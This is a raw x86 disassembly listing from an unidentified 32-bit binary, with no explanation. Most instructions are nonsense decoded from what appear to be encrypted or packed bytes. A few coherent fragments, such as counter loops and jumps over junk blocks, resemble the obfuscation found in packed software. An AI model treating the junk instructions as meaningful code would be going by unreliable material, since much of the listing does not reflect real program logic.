  40dac0:	adc    ebx,DWORD PTR [ebp+0xf]
  40dac3:	cli    
  40dac4:	push   edx
  40dac5:	pop    esp
  40dac6:	inc    esi
  40dac7:	iret   
  40dac8:	cwde   
  40dac9:	sar    DWORD PTR [edx+0x72a1487c],0x33
  40dad0:	sbb    ebp,DWORD PTR [edx-0x77]
  40dad3:	loope  0x40db37
  40dad5:	leave  
  40dad6:	inc    esp
  40dad7:	lahf   
  40dad8:	test   eax,0xd18b4bbb
  40dadd:	ds mov esp,0xfe6729ef
  40dae3:	pusha  
  40dae4:	in     al,0xe7
  40dae6:	imul   ecx,DWORD PTR [ebx+0x2cded625],0x23
  40daed:	retf   0x5db7
  40daf0:	adc    BYTE PTR [ebx],bh
  40daf2:	out    dx,al
  40daf3:	icebp  
  40daf4:	cli    
  40daf5:	sub    al,0x78
  40daf7:	daa    
  40daf8:	pushf  
  40daf9:	push   ecx
  40dafa:	add    eax,0x25e31854
  40daff:	jbe    0x40db12
  40db01:	in     al,dx
  40db02:	mov    dl,0xa6
  40db04:	push   esi
  40db05:	test   dl,bh
  40db07:	rcr    BYTE PTR [edi-0x4772c8e7],1
  40db0d:	ret    0x36c5
  40db10:	dec    ebp
  40db11:	inc    esp
  40db12:	pop    ebx
  40db13:	repnz fnstenv [esp+eax*1-0x41cb9f0d]
  40db1b:	pop    es
  40db1c:	test   BYTE PTR [ebp+0x766a95ea],ah
  40db22:	push   bp
  40db24:	and    esi,DWORD PTR ds:0xecd118bc
  40db2a:	aam    0x6
  40db2c:	xor    DWORD PTR [ebx-0x70e74692],esi
  40db32:	push   ebp
  40db33:	loope  0x40db1c
  40db35:	(bad)  
  40db37:	pushf  
  40db38:	sti    
  40db39:	loope  0x40dad7
  40db3b:	out    dx,al
  40db3c:	nop
  40db3d:	adc    bh,BYTE PTR [edi]
  40db3f:	punpcklbw mm1,mm1
  40db42:	and    al,0xde
  40db44:	in     al,0xba
  40db46:	xchg   BYTE PTR [ecx-0x1f],bh
  40db49:	and    eax,0x37094b05
  40db4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db4f:	sbb    DWORD PTR [edx-0x33b1a95d],0x11
  40db56:	pushf  
  40db57:	shl    BYTE PTR [ebx],0x24
  40db5a:	sub    BYTE PTR [ebx-0x6],ch
  40db5d:	mov    ds:0x7bcbd773,eax
  40db62:	sahf   
  40db63:	dec    esi
  40db64:	popf   
  40db65:	sahf   
  40db66:	imul   ebx,DWORD PTR [edi+ecx*4],0xf8a05c39
  40db6d:	jecxz  0x40db59
  40db6f:	and    bh,BYTE PTR [ebp+0x7b]
  40db72:	aam    0x34
  40db74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db75:	and    BYTE PTR [edi],ch
  40db77:	push   ebx
  40db78:	nop
  40db79:	mov    esp,DWORD PTR [ebp+0x3b]
  40db7c:	jecxz  0x40db97
  40db7e:	xor    cl,BYTE PTR [ebx]
  40db80:	or     edx,DWORD PTR [ecx]
  40db82:	cmp    eax,0xb8cc0539
  40db87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db88:	pop    edi
  40db89:	sub    eax,0x21a9a081
  40db8e:	inc    ebx
  40db8f:	gs pusha 
  40db91:	or     al,0x43
  40db93:	outs   dx,BYTE PTR ds:[esi]
  40db94:	neg    edx
  40db96:	jbe    0x40db4e
  40db98:	mov    ds:0x41b67021,eax
  40db9d:	(bad)  
  40db9e:	fdivr  DWORD PTR [esi+0x1b]
  40dba1:	clc    
  40dba2:	scas   eax,DWORD PTR es:[edi]
  40dba3:	jp     0x40db8d
  40dba5:	outs   dx,BYTE PTR ds:[esi]
  40dba6:	or     ecx,esi
  40dba8:	loope  0x40dc0c
  40dbaa:	leave  
  40dbab:	stos   BYTE PTR es:[edi],al
  40dbac:	cmp    esp,DWORD PTR ds:0xf18c841b
  40dbb2:	pop    esp
  40dbb3:	dec    esi
  40dbb4:	lock cmp eax,ecx
  40dbb7:	jne    0x40de3d
  40dbbd:	mov    eax,DWORD PTR [ebp-0x4]
  40dbc0:	xor    eax,edi
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi-0x75bfeba4],0xfa7d8324
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dc34
  40dbe0:	pop    edi
  40dbe1:	pop    ss
  40dbe2:	je     0x40dbe6
  40dbe4:	mov    bh,cl
  40dbe6:	sub    BYTE PTR [edx+0x42],0x2a
  40dbea:	out    0xc0,al
  40dbec:	dec    edi
  40dbed:	popf   
  40dbee:	in     al,dx
  40dbef:	js     0x40dbf2
  40dbf1:	sbb    eax,0x8f9b158a
  40dbf6:	mov    DWORD PTR [eax+0x2260f97c],edx
  40dbfc:	stc    
  40dbfd:	xchg   bh,dh
  40dbff:	addr16 js 0x40db9d
  40dc02:	mov    bl,BYTE PTR [esi+0x3e7ce8b6]
  40dc08:	jmp    0x40dbec
  40dc0a:	fs cs int 0x2d
  40dc0e:	push   es
  40dc0f:	repnz (bad) 
  40dc11:	adc    ecx,DWORD PTR [eax]
  40dc13:	and    cl,cl
  40dc15:	in     eax,dx
  40dc16:	mov    eax,0x99a1ed36
  40dc1b:	push   edx
  40dc1c:	test   ecx,esi
  40dc1e:	push   0x96117c37
  40dc23:	push   edx
  40dc24:	enter  0x8114,0x56
  40dc28:	sahf   
  40dc29:	lahf   
  40dc2a:	ficomp DWORD PTR [esi-0x48]
  40dc2d:	push   cs
  40dc2e:	push   0x31
  40dc30:	test   BYTE PTR [ebx-0x6469ce63],ah
  40dc36:	rol    BYTE PTR [esp+esi*1+0x33c59a54],1
  40dc3d:	jl     0x40dc4c
  40dc3f:	adc    DWORD PTR [eax+edi*8+0x27],ebp
  40dc43:	out    dx,eax
  40dc44:	sub    bl,BYTE PTR [edx-0x2df789ab]
  40dc4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc4b:	pop    ebx
  40dc4c:	test   eax,0x3563a07e
  40dc51:	(bad)  
  40dc53:	ins    BYTE PTR es:[edi],dx
  40dc54:	inc    ecx
  40dc55:	aam    0xda
  40dc57:	sub    BYTE PTR [ebx+esi*8-0x3b42f2ab],bl
  40dc5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc5f:	lea    edx,[edx]
  40dc61:	(bad)  
  40dc62:	rol    DWORD PTR [edi+0x3e],1
  40dc65:	dec    ebp
  40dc66:	mul    DWORD PTR [ebx-0x21]
  40dc69:	in     eax,0x2c
  40dc6b:	inc    eax
  40dc6c:	or     bl,BYTE PTR [edx-0x4af0ffc8]
  40dc72:	mov    bl,0xad
  40dc74:	cld    
  40dc75:	(bad)  
  40dc76:	push   esp
  40dc77:	pop    edi
  40dc78:	pop    ss
  40dc79:	stos   DWORD PTR es:[edi],eax
  40dc7a:	test   eax,0x349ee975
  40dc7f:	and    dh,BYTE PTR [ebx]
  40dc81:	and    ebp,DWORD PTR [esi+0x72]
  40dc84:	aas    
  40dc85:	jmp    0xb2a5bc05
  40dc8a:	loopne 0x40dc3f
  40dc8c:	xchg   edx,eax
  40dc8d:	mov    ebp,0x36ffe84e
  40dc92:	das    
  40dc93:	loop   0x40dd0e
  40dc95:	pop    es
  40dc96:	int3   
  40dc97:	push   0x4e213fa8
  40dc9c:	inc    ecx
  40dc9d:	fs fwait
  40dc9f:	jg     0x40dc7e
  40dca1:	and    BYTE PTR [ebx-0x5845a0b9],0xc
  40dca8:	xor    eax,0x25b9e3dd
  40dcad:	mov    esp,0xff507cff
  40dcb2:	movsx  ebx,sp
  40dcb5:	not    BYTE PTR [ecx-0x3]
  40dcb8:	mov    al,0x75
  40dcba:	call   0x61da8d6b
  40dcbf:	sbb    dl,ah
  40dcc1:	fisttp DWORD PTR [eax]
  40dcc3:	and    BYTE PTR [esi-0x2e7b1730],al
  40dcc9:	out    dx,eax
  40dcca:	jecxz  0x40dd05
  40dccc:	outs   dx,DWORD PTR ds:[esi]
  40dccd:	or     ebp,DWORD PTR [edi-0x2]
  40dcd0:	fst    DWORD PTR [edx-0x55a70112]
  40dcd6:	inc    esi
  40dcd7:	shl    BYTE PTR [edi-0x30fd174f],cl
  40dcdd:	addr16 pop ecx
  40dcdf:	adc    eax,0x7d87c37b
  40dce4:	cmp    al,0x90
  40dce6:	(bad)  
  40dce8:	test   eax,0x5471b69d
  40dced:	xor    eax,0x1a6c2be5
  40dcf2:	leave  
  40dcf3:	mov    bh,0xd1
  40dcf5:	rol    DWORD PTR [ecx],1
  40dcf7:	mov    ds:0xa98034e6,al
  40dcfc:	xor    al,0x44
  40dcfe:	loope  0x40dd3d
  40dd00:	adc    ecx,0xffffffa6
  40dd03:	pop    esp
  40dd04:	dec    edx
  40dd05:	mov    al,0xda
  40dd07:	out    dx,al
  40dd08:	icebp  
  40dd09:	inc    ebx
  40dd0a:	jmp    0x40dd23
  40dd0c:	cmp    eax,0xcc5c3c9e
  40dd11:	xchg   DWORD PTR [esi-0x3f9e1029],edi
  40dd17:	jmp    0x23b03ef4
  40dd1c:	dec    ebx
  40dd1d:	in     al,dx
  40dd1e:	loopne 0x40dd7e
  40dd20:	jmp    0x8580a57c
  40dd25:	or     al,0xec
  40dd27:	dec    esi
  40dd28:	and    bh,BYTE PTR [ecx+0x57aa66a0]
  40dd2e:	push   ds
  40dd2f:	ins    BYTE PTR es:[edi],dx
  40dd30:	xlat   BYTE PTR ds:[ebx]
  40dd31:	mov    esp,DWORD PTR [eax-0x42]
  40dd34:	enter  0xfa2e,0x23
  40dd38:	aas    
  40dd39:	rol    DWORD PTR [ebx-0xebb1904],cl
  40dd3f:	out    dx,al
  40dd40:	or     esp,0xbf8cb748
  40dd46:	inc    ecx
  40dd47:	jle    0x40dce8
  40dd49:	xor    al,BYTE PTR [eax-0x67]
  40dd4c:	mov    ebp,DWORD PTR [ebx-0x16]
  40dd4f:	das    
  40dd50:	xor    eax,0xe0437761
  40dd55:	xor    al,0xa7
  40dd57:	add    eax,0x3ef389b3
  40dd5c:	xor    bl,BYTE PTR [ebx]
  40dd5e:	int3   
  40dd5f:	repz dec esi
  40dd61:	jbe    0x40dd45
  40dd63:	and    al,BYTE PTR [eax]
  40dd65:	push   ebx
  40dd66:	call   0x68d3:0x9352d775
  40dd6d:	jno    0x40dd3b
  40dd6f:	(bad)  
  40dd70:	rcr    BYTE PTR [edi+0x19],cl
  40dd73:	idiv   DWORD PTR [ebp+ecx*1+0x55]
  40dd77:	inc    ecx
  40dd78:	mov    ds:0xf22264be,al
  40dd7d:	sub    ebx,0x71facac3
  40dd83:	addr16 mov ah,0xbb
  40dd86:	pop    es
  40dd87:	fist   WORD PTR [esp+esi*1+0xaea8dd4]
  40dd8e:	repnz nop
  40dd90:	out    0x45,al
  40dd92:	xor    eax,0xb7beecf8
  40dd97:	stos   BYTE PTR es:[edi],al
  40dd98:	ds inc ecx
  40dd9a:	inc    esi
  40dd9b:	cmc    
  40dd9c:	add    bh,BYTE PTR [esi]
  40dd9e:	push   ebx
  40dd9f:	mov    ebx,0x6b143b6d
  40dda4:	leave  
  40dda5:	mov    edx,0x39f8828f
  40ddaa:	mov    bl,0x4a
  40ddac:	in     eax,dx
  40ddad:	add    DWORD PTR [edi],esp
  40ddaf:	push   eax
  40ddb0:	dec    ecx
  40ddb1:	xchg   ebx,eax
  40ddb2:	test   esp,esi
  40ddb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddb5:	not    DWORD PTR [esi-0x4c]
  40ddb8:	lea    ebx,fs:[ecx]
  40ddbb:	mov    ah,0xed
  40ddbd:	lea    ebx,[edx+eiz*1]
  40ddc0:	inc    edi
  40ddc1:	stc    
  40ddc2:	fs add al,0x1d
  40ddc5:	pushf  
  40ddc6:	std    
  40ddc7:	loop   0x40dd82
  40ddc9:	sti    
  40ddca:	es (bad) 
  40ddcc:	cs pop edx
  40ddce:	push   esi
  40ddcf:	xchg   esi,eax
  40ddd0:	icebp  
  40ddd1:	xor    BYTE PTR [ecx-0x2207bc6d],0x31
  40ddd8:	cdq    
  40ddd9:	mov    WORD PTR [ebp+0x3c6b0b9b],cs
  40dddf:	push   ebp
  40dde0:	call   0x25fe6770
  40dde5:	cli    
  40dde6:	xchg   DWORD PTR [ecx+0x1fbc981b],ecx
  40ddec:	mov    eax,0xa2b5d810
  40ddf1:	sub    esi,DWORD PTR [edi+0x102ec446]
  40ddf7:	pop    edi
  40ddf8:	push   esi
  40ddf9:	adc    eax,0x22d538dc
  40ddfe:	push   es
  40ddff:	mov    edx,0xb108e58e
  40de04:	pop    ecx
  40de05:	fidiv  DWORD PTR [eax+0x46d0f8d6]
  40de0b:	leave  
  40de0c:	or     dl,bh
  40de0e:	xor    eax,DWORD PTR [eax]
  40de10:	sub    eax,0xcffa1209
  40de15:	loopne 0x40ddef
  40de17:	xchg   ecx,eax
  40de18:	inc    ebx
  40de19:	ja     0x40de30
  40de1b:	in     eax,0x7
  40de1d:	mov    BYTE PTR [esi+0x3],ah
  40de20:	(bad)  
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43371f,0x0
  40de5a:	mov    eax,ds:0x43371f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43371f,eax
  40de65:	cmp    DWORD PTR ds:0x43371f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43371f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x43376f,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	test   DWORD PTR [ebp-0x45b32480],0x127e7e9c
  40deaf:	jg     0x40df2f
  40deb1:	jle    0x40df20
  40deb3:	rol    edx,0xc4
  40deb6:	fistp  DWORD PTR [ebp-0x60]
  40deb9:	lahf   
  40deba:	in     al,dx
  40debb:	nop
  40debc:	outs   dx,DWORD PTR ds:[esi]
  40debd:	dec    ebp
  40debe:	mov    BYTE PTR [eax],ch
  40dec0:	into   
  40dec1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dec2:	repz cld 
  40dec4:	lock sub DWORD PTR [ebx],0xffffff9d
  40dec8:	xchg   edi,eax
  40dec9:	xlat   BYTE PTR ds:[ebx]
  40deca:	push   0xffffffb0
  40decc:	add    al,dh
  40dece:	cwde   
  40decf:	(bad)  
  40ded0:	inc    ebx
  40ded1:	loope  0x40deec
  40ded3:	or     DWORD PTR gs:[eax],ecx
  40ded6:	call   DWORD PTR [edi-0x61d942c3]
  40dedc:	mov    edi,0xf35a0133
  40dee1:	inc    ebp
  40dee2:	jbe    0x40deff
  40dee4:	add    ecx,edx
  40dee6:	in     al,dx
  40dee7:	xor    ebp,DWORD PTR [ebp-0x31]
  40deea:	cmp    ebx,DWORD PTR [ebx+0x7e6b859e]
  40def0:	iret   
  40def1:	dec    esi
  40def2:	pop    esi
  40def3:	add    dh,BYTE PTR [edi+0x67f1d3e8]
  40def9:	jmp    0x40df5f
  40defb:	xchg   esp,eax
  40defc:	jge    0x40de81
  40defe:	push   esi
  40deff:	and    BYTE PTR [esi],0xe7
  40df02:	add    BYTE PTR [ecx+0x729f9eae],dl
  40df08:	pop    edi
  40df09:	pop    ebp
  40df0a:	dec    ebp
  40df0b:	loopne 0x40df42
  40df0d:	sub    DWORD PTR [edx+esi*1-0x2be33a72],esp
  40df14:	out    0x34,al
  40df16:	cmp    dh,ch
  40df18:	and    BYTE PTR [edi],bl
  40df1a:	into   
  40df1b:	jge    0x40df16
  40df1d:	sbb    BYTE PTR [ebx],bh
  40df1f:	cmp    eax,DWORD PTR [ecx+0x48]
  40df22:	rcr    BYTE PTR ds:0x318924d0,cl
  40df28:	imul   ecx,DWORD PTR [eax],0x33
  40df2b:	fwait
  40df2c:	xor    esi,DWORD PTR [ebp+0x47b51115]
  40df32:	sar    DWORD PTR [edi-0x68b746a1],1
  40df38:	outs   dx,BYTE PTR ds:[esi]
  40df39:	ret    
  40df3a:	or     al,0x3b
  40df3c:	jmp    0x40dedd
  40df3e:	shl    BYTE PTR [ecx],1
  40df40:	inc    edx
  40df41:	add    ch,BYTE PTR [esi+0x3ac80964]
  40df47:	iret   
  40df48:	jle    0x40df99
  40df4a:	push   0xffffff82
  40df4c:	mov    bl,0x9b
  40df4e:	mov    dl,0xda
  40df50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df51:	stos   BYTE PTR es:[edi],al
  40df52:	sub    DWORD PTR [ebx+0x2ae4c9f2],0x56
  40df59:	mov    ebx,0x27094c07
  40df5e:	sub    DWORD PTR fs:[edi],ebx
  40df61:	dec    ax
  40df63:	out    0x15,eax
  40df65:	cli    
  40df66:	out    0xe2,al
  40df68:	out    dx,eax
  40df69:	pop    ds
  40df6a:	mov    esp,ebx
  40df6c:	lea    ebx,[esi+0x6d]
  40df6f:	adc    al,0xe
  40df71:	mov    BYTE PTR [ebx-0x4],0xc2
  40df75:	xchg   esp,eax
  40df76:	sbb    ecx,eax
  40df78:	jbe    0x40df5d
  40df7a:	daa    
  40df7b:	xor    al,0x50
  40df7d:	jo     0x40df05
  40df7f:	call   0x9885993
  40df84:	leave  
  40df85:	mov    dh,0x35
  40df87:	iret   
  40df88:	dec    esp
  40df89:	repnz cmp BYTE PTR [edi],bh
  40df8c:	(bad)  
  40df8d:	adc    al,0xed
  40df8f:	xchg   dh,ch
  40df91:	cmc    
  40df92:	sbb    eax,0x9d345dfe
  40df97:	les    ebp,FWORD PTR [ebx+0x1d]
  40df9a:	or     eax,0x1d4cb396
  40df9f:	and    DWORD PTR [esi+0x26],ebp
  40dfa2:	in     eax,dx
  40dfa3:	(bad)  
  40dfa4:	std    
  40dfa5:	fld    QWORD PTR [ecx]
  40dfa7:	gs repnz out dx,eax
  40dfaa:	test   al,0x21
  40dfac:	mov    dl,0xd7
  40dfae:	xchg   edi,ebx
  40dfb0:	adc    BYTE PTR [ebp-0x38],al
  40dfb3:	jb     0x40dfbf
  40dfb5:	pop    ds
  40dfb6:	mov    cl,0xcc
  40dfb8:	adc    BYTE PTR [eax],ah
  40dfba:	jnp    0x40df9e
  40dfbc:	imul   ebp,DWORD PTR [ebx],0x7b
  40dfbf:	jbe    0x40df71
  40dfc1:	test   esi,edx
  40dfc3:	div    DWORD PTR [edi+0x70]
  40dfc6:	hlt    
  40dfc7:	push   eax
  40dfc8:	popf   
  40dfc9:	cs loope 0x40df92
  40dfcc:	inc    esi
  40dfcd:	push   edi
  40dfce:	mov    eax,DWORD PTR [ebp+0x8]
  40dfd1:	sub    DWORD PTR ds:0x433717,0x625
  40dfdb:	push   ebx
  40dfdc:	sub    DWORD PTR ds:0x43376b,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	push   0x5ef4ea76
  40e008:	popf   
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40e041
  40e010:	xchg   esi,eax
  40e011:	jns    0x40dfef
  40e013:	cmp    al,BYTE PTR [ebx-0x5d]
  40e016:	out    0xa3,eax
  40e018:	pop    edi
  40e019:	loope  0x40e038
  40e01b:	sbb    BYTE PTR [ebp-0x58],bh
  40e01e:	xor    eax,0xfbee8299
  40e023:	fwait
  40e024:	and    eax,0xba6e70e9
  40e029:	cmp    al,0xa4
  40e02b:	adc    al,0xc7
  40e02d:	adc    esp,DWORD PTR [eax]
  40e02f:	adc    al,0x70
  40e031:	jno    0x40dfb6
  40e033:	inc    ebp
  40e034:	shl    ecx,0x59
  40e037:	lods   eax,DWORD PTR ds:[esi]
  40e038:	bnd jp 0x40e02b
  40e03b:	(bad)  
  40e03c:	in     al,0xcb
  40e03e:	xor    DWORD PTR [ebx],esp
  40e040:	mov    ebx,0x39a43fc3
  40e045:	pop    ebp
  40e046:	inc    eax
  40e047:	pop    ecx
  40e048:	ins    DWORD PTR es:[edi],dx
  40e049:	fistp  WORD PTR [edx]
  40e04b:	cdq    
  40e04c:	adc    ebx,ebx
  40e04e:	rol    DWORD PTR [edi-0x11],0x53
  40e052:	icebp  
  40e053:	aad    0xf9
  40e055:	int3   
  40e056:	test   eax,0xe896581a
  40e05b:	pop    esi
  40e05c:	loopne 0x40e062
  40e05e:	jb     0x40e093
  40e060:	xor    al,0x8
  40e062:	mov    ebx,0xe0a10f2f
  40e067:	rcl    BYTE PTR [ebp-0x244d7e49],cl
  40e06d:	inc    esp
  40e06e:	ror    BYTE PTR [ecx+edi*2+0x41],1
  40e072:	dec    ebx
  40e073:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e074:	bound  ecx,QWORD PTR [esi]
  40e076:	aas    
  40e077:	cmp    dl,bl
  40e079:	sbb    esp,edx
  40e07b:	aad    0x5
  40e07d:	xor    al,0x48
  40e07f:	pop    edx
  40e080:	push   ss
  40e081:	outs   dx,DWORD PTR ds:[esi]
  40e082:	push   edx
  40e083:	and    DWORD PTR [ecx],ecx
  40e085:	leave  
  40e086:	dec    BYTE PTR [eax+0x65]
  40e089:	pop    ebx
  40e08a:	push   0x32
  40e08c:	repnz jecxz 0x40e066
  40e08f:	add    al,0x5c
  40e091:	push   eax
  40e092:	fnstenv [esi]
  40e094:	cmp    eax,0x30a00302
  40e099:	mov    dh,0x9a
  40e09b:	inc    esp
  40e09c:	mov    ah,0xfd
  40e09e:	retf   
  40e09f:	push   ebx
  40e0a0:	(bad)  
  40e0a1:	je     0x40e029
  40e0a3:	sbb    dl,bh
  40e0a5:	fnstenv [ebp+ecx*4+0x2bd6fabf]
  40e0ac:	into   
  40e0ad:	ret    
  40e0ae:	bound  ebp,QWORD PTR [ebp-0x77]
  40e0b1:	mov    DWORD PTR [edi],0xe28af720
  40e0b7:	mov    ebp,0x3ac32d5b
  40e0bc:	and    dl,BYTE PTR [ebx+0x4]
  40e0bf:	lods   eax,DWORD PTR ds:[esi]
  40e0c0:	int    0xff
  40e0c2:	outs   dx,DWORD PTR ds:[esi]
  40e0c3:	repz mov fs,eax
  40e0c6:	jo     0x40e0e5
  40e0c8:	dec    ecx
  40e0c9:	lahf   
  40e0ca:	fldenv [esi+0x2fa35904]
  40e0d0:	dec    ecx
  40e0d1:	inc    edx
  40e0d2:	mov    eax,ds:0x98c733e4
  40e0d7:	cmc    
  40e0d8:	inc    edx
  40e0d9:	and    eax,0x7680abea
  40e0de:	push   ebx
  40e0df:	jno    0x40e0d1
  40e0e1:	clc    
  40e0e2:	mov    al,BYTE PTR [ecx]
  40e0e4:	or     DWORD PTR [esi],ecx
  40e0e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0e7:	adc    esi,DWORD PTR [ebx+0x77]
  40e0ea:	std    
  40e0eb:	loopne 0x40e0b1
  40e0ed:	fcom   QWORD PTR [edi-0x31]
  40e0f0:	pusha  
  40e0f1:	fcmovne st,st(2)
  40e0f3:	push   0xffffffda
  40e0f5:	fnsave [edi+0x55f53e3f]
  40e0fb:	sbb    BYTE PTR [ebx],dh
  40e0fd:	call   0x90ff1610
  40e102:	fwait
  40e103:	push   eax
  40e104:	xchg   edi,eax
  40e105:	or     ch,BYTE PTR [ecx+0x37]
  40e108:	cs es retf 0xed83
  40e10d:	cli    
  40e10e:	pop    edi
  40e10f:	adc    DWORD PTR [ebx-0xe],ebp
  40e112:	clc    
  40e113:	push   cs
  40e114:	jne    0x40e128
  40e116:	cmp    ch,dh
  40e118:	inc    edi
  40e119:	(bad)  
  40e11a:	push   ds
  40e11b:	loop   0x40e160
  40e11d:	mov    edx,edi
  40e11f:	push   ecx
  40e120:	lods   al,BYTE PTR ds:[esi]
  40e121:	fs mov ah,0xa0
  40e124:	scas   eax,DWORD PTR es:[edi]
  40e125:	(bad)  
  40e127:	lds    esp,FWORD PTR [edx-0x39ccd879]
  40e12d:	adc    DWORD PTR ds:0x433723,0x2097
  40e137:	mov    ebx,0x32729b
  40e13c:	xor    DWORD PTR ds:0x43376f,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	mov    ah,0xb0
  40e15c:	daa    
  40e15d:	push   0x72
  40e15f:	call   0x7e7e:0x7f127e7e
  40e166:	test   BYTE PTR [edx],bl
  40e168:	mov    eax,?
  40e16a:	in     eax,0xb
  40e16c:	icebp  
  40e16d:	lea    ebx,[ebp-0x5315c3c9]
  40e173:	add    al,0x6e
  40e175:	aaa    
  40e176:	mov    ecx,0x46d0e662
  40e17b:	out    dx,eax
  40e17c:	popf   
  40e17d:	sbb    eax,0xbebfcc64
  40e182:	stos   DWORD PTR es:[edi],eax
  40e183:	adc    BYTE PTR [esi],dh
  40e185:	xchg   esp,eax
  40e186:	gs scas al,BYTE PTR es:[edi]
  40e188:	out    0x10,al
  40e18a:	or     eax,0xaad11f71
  40e18f:	aas    
  40e190:	cwde   
  40e191:	fsubr  QWORD PTR es:[ebx]
  40e194:	test   eax,0x1bdfe7a1
  40e199:	sub    bl,al
  40e19b:	jmp    0x1ceb:0x81c4c7ca
  40e1a2:	push   es
  40e1a3:	outs   dx,BYTE PTR ds:[esi]
  40e1a4:	sti    
  40e1a5:	or     dh,BYTE PTR [eax-0x5f8f6253]
  40e1ab:	sub    BYTE PTR [esp+ebp*1+0x7371b7d6],al
  40e1b2:	mov    eax,0x833f7792
  40e1b7:	(bad)  
  40e1b8:	icebp  
  40e1b9:	loopne 0x40e1d0
  40e1bb:	pop    esp
  40e1bc:	hlt    
  40e1bd:	and    DWORD PTR [ebx-0x2e],edi
  40e1c0:	push   edx
  40e1c1:	sbb    dh,BYTE PTR [edx+0x207a81cc]
  40e1c7:	or     eax,0x4ef9d698
  40e1cc:	bound  ebp,QWORD PTR [edi+0x77]
  40e1cf:	lods   eax,DWORD PTR ds:[esi]
  40e1d0:	loopne 0x40e206
  40e1d2:	push   es
  40e1d3:	mov    esi,0x725a6cb6
  40e1d8:	sbb    bh,ah
  40e1da:	rcr    BYTE PTR [esi-0x53],cl
  40e1dd:	jecxz  0x40e1b3
  40e1df:	and    ecx,DWORD PTR [ecx]
  40e1e1:	mov    WORD PTR [ebx+esi*8+0x13041112],fs
  40e1e8:	dec    ecx
  40e1e9:	or     BYTE PTR [eax-0x75],al
  40e1ec:	popf   
  40e1ed:	(bad)  
  40e1ee:	mov    dh,0xcd
  40e1f0:	and    al,0x1d
  40e1f2:	sub    BYTE PTR [eax],bh
  40e1f4:	aad    0x38
  40e1f6:	pushf  
  40e1f7:	add    eax,0x24da79b1
  40e1fc:	add    edi,esi
  40e1fe:	xor    esi,DWORD PTR [esi]
  40e200:	add    ch,cl
  40e202:	fild   WORD PTR [edx-0x9758132]
  40e208:	cmp    ebp,esp
  40e20a:	loopne 0x40e1e3
  40e20c:	std    
  40e20d:	sub    eax,0xa4525637
  40e212:	je     0x40e1d5
  40e214:	loope  0x40e1e6
  40e216:	jmp    0x40e1b1
  40e218:	fisubr WORD PTR [ebx+edi*1+0x71]
  40e21c:	and    dl,BYTE PTR ds:0xd8c17d67
  40e222:	mov    ebx,0x2edb8b04
  40e227:	les    edi,FWORD PTR [ebp+0x704e16c9]
  40e22d:	imul   esi,DWORD PTR [ebx-0x79],0xffffffcf
  40e231:	fs pushf 
  40e233:	scas   al,BYTE PTR es:[edi]
  40e234:	adc    DWORD PTR [esi+eax*8+0x1eab2c59],eax
  40e23b:	nop
  40e23c:	popa   
  40e23d:	or     cl,BYTE PTR [eax]
  40e23f:	adc    eax,0x46c99e52
  40e244:	retf   
  40e245:	push   ebp
  40e246:	inc    ebp
  40e247:	fcomp  QWORD PTR [esi+0x4b2f6645]
  40e24d:	popa   
  40e24e:	loope  0x40e1fd
  40e250:	hlt    
  40e251:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e252:	cmp    al,0x4d
  40e254:	cmp    edx,ecx
  40e256:	out    dx,eax
  40e257:	icebp  
  40e258:	icebp  
  40e259:	inc    esi
  40e25a:	adc    al,0xbb
  40e25c:	daa    
  40e25d:	aam    0x18
  40e25f:	dec    BYTE PTR [ebx+0x8]
  40e262:	jecxz  0x40e2b7
  40e264:	dec    esi
  40e265:	pusha  
  40e266:	xor    DWORD PTR es:[edi-0x7c],edx
  40e26a:	sub    DWORD PTR [edi-0x5992ab30],ecx
